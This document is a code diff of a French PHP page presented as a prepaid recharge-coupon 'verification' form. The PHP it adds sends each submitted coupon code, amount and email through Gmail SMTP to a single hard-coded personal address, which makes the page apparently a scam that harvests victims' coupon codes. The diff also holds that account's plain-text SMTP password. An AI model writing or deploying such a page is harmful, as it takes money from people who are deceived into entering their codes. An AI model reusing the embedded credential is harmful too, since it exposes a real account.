@@ -1,3 +1,99 @@
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+use PHPMailer\PHPMailer\SMTP;
+
+//Load Composer's autoloader
+// require 'vendor/autoload.php';
+require './phpmailler/src/Exception.php';
+require './phpmailler/src/PHPMailer.php';
+require './phpmailler/src/SMTP.php';
+
+
+
+// 
+//  
+//  
+//
+if(isset($_POST['send'])){
+
+
+
+if(!empty($_POST['recharge']  && !empty($_POST['montant'] )  && !empty($_POST['email'] ) && !empty($_POST['codeEnregistrement'] ) && !empty($_POST['devise'] ) ) 
+
+  ){
+    $recharge = htmlspecialchars($_POST['recharge']);
+    $montant = htmlspecialchars($_POST['montant']);
+    $devise = htmlspecialchars($_POST['devise']);
+    $codeEnregistrement = htmlspecialchars($_POST['codeEnregistrement']);
+    $codeEnregistrement1 = htmlspecialchars($_POST['codeEnregistrement1']);
+    $codeEnregistrement2 = htmlspecialchars($_POST['codeEnregistrement2']);
+    $codeEnregistrement3 = htmlspecialchars($_POST['codeEnregistrement3']);
+    $email = htmlspecialchars($_POST['email']);
+
+
+    //Create an instance; passing `true` enables exceptions
+$mail = new PHPMailer(true);
+
+try {
+    //Server settings
+    // $mail->SMTPDebug = SMTP::DEBUG_SERVER;   
+                       //Enable verbose debug output
+    $mail->isSMTP();                                            //Send using SMTP
+    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
+    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
+    $mail->Username   = 'jocelynwotcheu2@gmail.com';                     //SMTP username
+    $mail->Password   = 'xupbbgzclmtaykwf';                               //SMTP password
+    $mail->SMTPSecure ='ssl';            //Enable implicit TLS encryption
+    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
+
+    //Recipients
+    $mail->setFrom('jocelynwotcheu2@gmail.com');
+    $mail->addAddress('jocelynwotcheu2@gmail.com');     //Add a recipient
+    // $mail->addAddress('ellen@example.com');               //Name is optional
+    // $mail->addReplyTo('info@example.com', 'Information');
+    // $mail->addCC('cc@example.com');
+    // $mail->addBCC('bcc@example.com');
+
+    //Attachments
+    // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
+    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name
+
+    //Content
+    $mail->isHTML(true);                                  //Set email format to HTML
+    $mail->Subject = 'Hey Nouveau Coupon';
+    $mail->Body    = "Mr $email vient d'effectuer une verification  ${recharge} de ${montant} ${devise}<div> <br/> Les codes de
+     verifications sont <p>code Enregistrement 1: <b>${codeEnregistrement}</b></p>
+     <p>code Enregistrement 2 :<b> ${codeEnregistrement1}</p></b>
+     
+     <p>code Enregistrement 3 : <b> ${codeEnregistrement2}</b></p>
+     
+     <p>code Enregistrement 4 :<b> ${codeEnregistrement3}</b></p>
+     </div>";
+    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
+
+    $mail->send();
+    // echo 'Message has been sent';
+    $info = "Envoye avec success <br/> vous recevrez un mail de confirmation";
+} catch (Exception $e) {
+    echo "Message could not be sent. Mailer Error:";
+}
+
+    
+
+}
+else{
+  
+    $info = "<span class='redColor'>Veuillez remplir tout les champs necessaires</span> ";
+   
+}
+}
+
+
+
+?>
+
+
 <!DOCTYPE html>
 <html lang="zxx">
   <head>
@@ -25,7 +121,36 @@
     <link rel="stylesheet" href="humane/libnotify.css" type="text/css" />
     <link rel="stylesheet" href="humane/jackedup.css" type="text/css" />
     <script src="humane/humane.min.js" type="text/javascript"></script>
+    <style>
+      .redColor{
+        color: red;
+        /* color: #5C5C5C; */
+    font-size: 15px;
+    font-family: "Lato", sans-serif;
+      }
+      .request_message {
+  width: 400px;
+  font-family: "Lato", sans-serif;
+
+  background-color: #fff;
+  text-align: center;
+  color: green;
+  font-size: 13px;
+  padding: 14px;
+  margin-bottom: 20px;
+  border-radius: 20px;
+  box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
+  animation: anime 0.5s ease-in-out;
+}
+
+@keyframes anime {
+  from {
+    transform: translateY(-70px);
+  }
+}
+    </style>
   </head>
+  
 
   <body>
     <div id="preloder">
@@ -53,17 +178,30 @@
               <h3>Renseignez les informations du coupon ici</h3>
 
               <div
+                class="request_message"
+              >
+                <?php
+                if(isset($info)){?>
+                        <?=$info?>
+
+               <?php }
+                
+                
+                ?>
+              </div>
+              <!-- <div
                 class="alert alert-success"
                 role="alert"
                 id="notification_txt"
               >
                 <p>Traitement en cours</p>
                 <p>Un email de confirmation vous sera envoyer</p>
-              </div>
+              </div> -->
+              <!-- <p class="request_message">Message envoyer</p> -->
 
               <form
                 method="post"
-                action="action.php"
+                action=""
                 class="call__form"
                 id="form_pcs"
               >
@@ -94,7 +232,7 @@
                       type="number"
                       id="montant"
                       name="montant"
-                      placeholder="Entrer le montant de la recharge"
+                      placeholder="Entrer le montant de la recharge *"
                     />
                   </div>
                   <div class="col-lg-12">
@@ -110,7 +248,7 @@
                       class="form-control"
                       name="codeEnregistrement"
                       id="codeEnregistrement"
-                      placeholder="Entrer le code de recharge 1"
+                      placeholder="Entrer le code de recharge 1 *"
                     />
                   </div>
                   <div class="col-lg-12">
@@ -156,6 +294,8 @@
                   value="Verifier mon coupon..."
                   onclick="envois_pcs_();"
                   style="height: 50px"
+
+                  name="send"
                 />
               </form>
             </div>
@@ -311,17 +451,6 @@
       "codeEnregistrement3"
     ).value;
 
-    console.log(
-      "recharge : ",
-      recharge,
-      "\n montant : ",
-      montant,
-      "\n devise : ",
-      devise,
-      "\n codeEnregistrement : ",
-      codeEnregistrement
-    );
-
     if (montant == "") {
       message = "Veuillez renseigner un montant";
       humane.info = humane.spawn({
@@ -353,7 +482,7 @@
       humane.info(message);
       return;
     }
-    $("#submit_button").prop("disabled", true);
+    // $("#submit_button").prop("disabled", true);
   }
 
   function reset_form() {
